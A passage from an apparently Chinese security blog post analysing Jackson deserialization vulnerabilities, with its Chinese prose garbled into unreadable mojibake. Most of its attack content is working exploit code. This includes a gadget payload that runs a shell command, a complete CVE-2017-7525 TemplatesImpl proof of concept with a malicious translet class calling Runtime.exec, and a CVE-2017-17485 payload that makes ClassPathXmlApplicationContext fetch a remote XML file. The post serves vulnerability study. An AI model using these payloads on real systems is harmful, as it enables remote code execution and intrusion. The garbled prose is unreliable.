src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735013083610-aca256bf-d979-4361-9054-63ff5dcb575a.png"></p><p>è¿™é‡Œåœ¨å‡½æ•°æœ€åä¼šè°ƒç”¨deserializeTypedFromObjectæ–¹æ³•è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735013259513-f8402e8c-49c7-400d-aa2d-fd9b7dc83a89.png"></p><p>ä¼šèµ°åˆ°_deserializeTypedUsingDefaultImplæ–¹æ³•é‡Œå»è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735013366577-12b29d51-b1df-4705-bc98-72349d3777a6.png"></p><p>æ¥ç€ä¼šèµ°åˆ°è¿™ä¸ªdeserializeTypedFromAnyæ–¹æ³•ä¸­çœ‹çœ‹å¹²äº†ä»€ä¹ˆ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735013427069-b0d36b1b-49fb-4a9e-b982-dce1266f9f28.png"></p><p>ç»§ç»­è°ƒç”¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735013446640-1f1f2030-893b-454d-bd5d-bab1e83d618a.png"></p><p>è¿™é‡Œè°ƒäº†ä¸€ä¸ªååºåˆ—åŒ–æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735013486083-061907e7-ea76-4682-8a08-f46774fffde7.png"></p><p>åˆ°è¿™é‡Œå°±ä¼šå‘ç°å’Œå‰é¢å®ä¾‹åŒ–å¯¹è±¡å°±å¾ˆåƒäº†å°±æ˜¯å‰é¢çš„æµç¨‹åœ¨èµ°ä¸€éã€‚</p><h2 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h2><p>é€šè¿‡ä¸Šé¢çš„è°ƒè¯•æµç¨‹åˆ†æå¯ä»¥å¾—å‡ºå¦‚æœæƒ³è¦è§¦å‘æ¼æ´éœ€è¦æœ‰å‡ ä¸ªå‰ææ¡ä»¶</p><ul><li>è°ƒç”¨äº†ObjectMapper.enableDefaultTyping()å‡½æ•°ï¼›</li><li>å¯¹è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»çš„å±æ€§ä½¿ç”¨äº†å€¼ä¸ºJsonTypeInfo.Id.CLASSçš„@JsonTypeInfoæ³¨è§£ï¼›</li><li>å¯¹è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»çš„å±æ€§ä½¿ç”¨äº†å€¼ä¸ºJsonTypeInfo.Id.MINIMAL_CLASSçš„@JsonTypeInfoæ³¨è§£ï¼›</li></ul><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>å½“ä½¿ç”¨çš„JacksonPolymorphicDeserializationæœºåˆ¶é…ç½®æœ‰é—®é¢˜æ—¶ï¼ŒJacksonååºåˆ—åŒ–å°±ä¼šè°ƒç”¨å±æ€§æ‰€å±ç±»çš„æ„é€ å‡½æ•°å’Œsetteræ–¹æ³•ã€‚è€Œå¦‚æœè¯¥æ„é€ å‡½æ•°æˆ–setteræ–¹æ³•å­˜åœ¨å±é™©æ“ä½œï¼Œé‚£ä¹ˆå°±å­˜åœ¨Jacksonååºåˆ—åŒ–æ¼æ´ã€‚ä¸‹é¢æ‰‹åŠ¨å®éªŒä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735015852993-7e282fff-e173-4737-8054-bb94fdad9a76.png"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨çš„ï¼Œä½†æ˜¯å¾ˆå°‘ä¼šæœ‰å¼€å‘æŠŠå±é™©æ–¹æ³•å†™åœ¨setteræ–¹æ³•æˆ–è€…æ„é€ å‡½æ•°é‡Œçš„ã€‚ä½†æ˜¯å¦‚æœå±æ€§ä¸ºobjectç±»å‹çš„è¯å°±å¯ä»¥ç»™è¿™ä¸ªå±æ€§èµ‹å€¼ä»»ä½•ç±»å‹é‚£ä¹ˆå°±å¯ä»¥å¯»æ‰¾å­˜åœ¨æ„é€ å‡½æ•°æˆ–setteræ–¹æ³•ä¸­å­˜åœ¨æ¼æ´çš„ç±»è¿›è¡Œåˆ©ç”¨äº†æˆ‘ä»¬è‡ªå·±å…ˆå†™ä¸€ä¸ªdemoè¯•è¯•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735016417455-aab7d1de-065b-4998-a801-949dc463dddb.png"></p><p>å…ˆå¼•å…¥ä¸€ä¸ªæ¶æ„ç±»æ‰‹åŠ¨æ„é€ ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> objectMapper.readValue(<span class="string">&quot;&#123;\&quot;age\&quot;:0,\&quot;name\&quot;:null,\&quot;object\&quot;:&#123;\&quot;@class\&quot;:\&quot;com.ocean.zbz\&quot;,\&quot;cmd\&quot;:\&quot;open -a Calculator\&quot;&#125;,\&quot;address\&quot;:null,\&quot;zbz\&quot;:null&#125;&quot;</span>, Person.class);</span><br><span class="line">        System.out.println(person1);</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735016454962-832a1786-ae0e-405a-99aa-ccbd196ec660.png"></p><p>æ˜¯å¯ä»¥æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨çš„</p><h3 id="CVE-2017-7525ï¼ˆåŸºäºTemplatesImplåˆ©ç”¨é“¾ï¼‰"><a href="#CVE-2017-7525ï¼ˆåŸºäºTemplatesImplåˆ©ç”¨é“¾ï¼‰" class="headerlink" title="CVE-2017-7525ï¼ˆåŸºäºTemplatesImplåˆ©ç”¨é“¾ï¼‰"></a>CVE-2017-7525ï¼ˆåŸºäºTemplatesImplåˆ©ç”¨é“¾ï¼‰</h3><h4 id="æ¡ä»¶ã€ç‰ˆæœ¬"><a href="#æ¡ä»¶ã€ç‰ˆæœ¬" class="headerlink" title="æ¡ä»¶ã€ç‰ˆæœ¬"></a>æ¡ä»¶ã€ç‰ˆæœ¬</h4><p>Jackson 2.6ç³»åˆ— &lt; 2.6.7.1</p><p>Jackson 2.7ç³»åˆ— &lt; 2.7.9.1</p><p>Jackson 2.8ç³»åˆ— &lt; 2.8.8.1</p><p>JDK&lt;7u80</p><p>pocä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.FileCopyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jackson_vul</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> readClassStr(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/jackson_stu/src/main/java/Exp.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;&#123;\&quot;object\&quot;:[&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletBytecodes&#x27;:[&#x27;&quot;</span>+exp+<span class="string">&quot;&#x27;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletName&#x27;:&#x27;hack&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;outputProperties&#x27;:&#123;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        Hack hack;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            hack = mapper.readValue(jsonInput, Hack.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">(String cls)</span>&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileCopyUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls)),byteArrayOutputStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encode(byteArrayOutputStream.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">            br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(line + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                System.out.println(sb);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;result.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!file.exists())&#123;</span><br><span class="line">                file.createNewFile();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">FileWriter</span> <span class="variable">fileWritter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file.getName(),<span class="literal">true</span>);</span><br><span class="line">            <span class="type">BufferedWriter</span> <span class="variable">bufferWritter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(fileWritter);</span><br><span class="line">            bufferWritter.write(sb.toString());</span><br><span class="line">            bufferWritter.close();</span><br><span class="line">            System.out.println(sb);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hack</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è°ƒè¯•åˆ†æ-1"><a href="#è°ƒè¯•åˆ†æ-1" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h4><p>å…¶å®è¿™é‡Œæˆ‘ä»¬ä¼šæœ‰ä¸€ä¸ªç–‘é—®å°±æ˜¯jacksonåœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ˜¯è°ƒç”¨setteræ–¹æ³•å¹¶æ²¡æœ‰æ‰§è¡Œgetteræ–¹æ³•è€Œtemplatesé“¾çš„æ¼æ´è§¦å‘ç‚¹æ˜¯åœ¨getteræ–¹æ³•é‡Œçš„æ‰€ä»¥æˆ‘ä»¬ä¸‹æ–­ç‚¹è·Ÿè¿›å»çœ‹çœ‹åˆ°åº•æ˜¯æ€ä¹ˆè§¦å‘çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735027327122-8aaf9855-d504-4458-82fa-32e05b25eb7f.png"></p><p>ç›´æ¥æ–­åˆ°å…³é”®ç‚¹è¿™é‡Œï¼Œè¿™é‡Œæœ€å…³é”®çš„å…¶å®å°±æ˜¯propè¿™ä¸ªå¯¹è±¡è°ƒç”¨SetterlessProperty.deserializeAndSet()æ¥è§£æoutputPropertieså±æ€§è€Œå‰é¢ä¸¤ä¸ªå±æ€§æ˜¯è°ƒç”¨çš„MethodProperty.deserializeAndSet()è§£æçš„ï¼Œå…¶ä¸­SetterlessProperty.deserializeAndSet()å‡½æ•°ä¸­æ˜¯è°ƒç”¨å±æ€§çš„getteræ–¹æ³•è€Œésetteræ–¹æ³•ï¼š<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735027394290-20b624d3-a3c1-4eda-a62d-7744f803f7b4.png"></p><p>ç„¶åè·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735027411092-cec4af20-f818-47a1-be21-6bbdf842b8ce.png"></p><p>è¿™é‡Œä¼šè°ƒç”¨getteræ–¹æ³•ã€‚åç»­çš„æ‰§è¡Œæµç¨‹å°±ä¸åœ¨åˆ†æäº†</p><p>è‡³äºä¸ºä»€ä¹ˆä¸èƒ½åœ¨é«˜ç‰ˆæœ¬çš„åˆ©ç”¨çœ‹çš„å…¶ä»–å¸ˆå‚…çš„åšå®¢å› ä¸ºæˆ‘æœ¬åœ°ç¯å¢ƒæœ‰ç‚¹é—®é¢˜</p><p>:::tips<br>éœ€è¦è®¾ç½®ä¸€ä¸ª<code>_factory</code>å±æ€§ï¼Œä½†æ˜¯æˆ‘ä»¬å¦‚æœåœ¨payloadä¸­æ·»åŠ è¯¥å±æ€§ï¼Œç¨‹åºä¼šæŠ¥é”™ï¼šcom.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field â€œ_factoryâ€ (class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl), not marked as ignorable (5 known properties: â€œuriresolverâ€, â€œtransletBytecodesâ€, â€œoutputPropertiesâ€, â€œtransletNameâ€, â€œstylesheetDOMâ€])</p><p>è¯´æ˜Jacksonä¸æ”¯æŒæˆ‘ä»¬æ·»åŠ <code>_tfactory</code>å±æ€§ã€‚</p><p>:::</p><h3 id="CVE-2017-17485ï¼ˆåŸºäºClassPathXmlApplicationContextåˆ©ç”¨é“¾ï¼‰"><a href="#CVE-2017-17485ï¼ˆåŸºäºClassPathXmlApplicationContextåˆ©ç”¨é“¾ï¼‰" class="headerlink" title="CVE-2017-17485ï¼ˆåŸºäºClassPathXmlApplicationContextåˆ©ç”¨é“¾ï¼‰"></a>CVE-2017-17485ï¼ˆåŸºäºClassPathXmlApplicationContextåˆ©ç”¨é“¾ï¼‰</h3><h4 id="æ¡ä»¶ã€ç‰ˆæœ¬-1"><a href="#æ¡ä»¶ã€ç‰ˆæœ¬-1" class="headerlink" title="æ¡ä»¶ã€ç‰ˆæœ¬"></a>æ¡ä»¶ã€ç‰ˆæœ¬</h4><p>Jackson 2.7ç³»åˆ— &lt; 2.7.9.2</p><p>Jackson 2.8ç³»åˆ— &lt; 2.8.11</p><p>Jackson 2.9ç³»åˆ— &lt; 2.9.4</p><p>jdkä¸å—é™åˆ¶å¯ä»¥åœ¨1.8çš„ç‰ˆæœ¬ä¸Šè·‘</p><h4 id="ä¾èµ–"><a href="#ä¾èµ–" class="headerlink" title="ä¾èµ–"></a>ä¾èµ–</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-codec/commons-codec --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.12</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-io/commons-io --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.5</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.springframework/spring-core --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">5.0</span><span class="number">.2</span>.RELEASE&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.springframework/spring-beans --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">5.0</span><span class="number">.2</span>.RELEASE&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.springframework/spring-context --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">5.0</span><span class="number">.2</span>.RELEASE&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.springframework/spring-expression --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-expression&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">5.0</span><span class="number">.2</span>.RELEASE&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-logging/commons-logging --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-logging&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jackson_vul_classpath</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;[\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;, \&quot;http://127.0.0.1/spel.xml\&quot;]&quot;</span>;</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 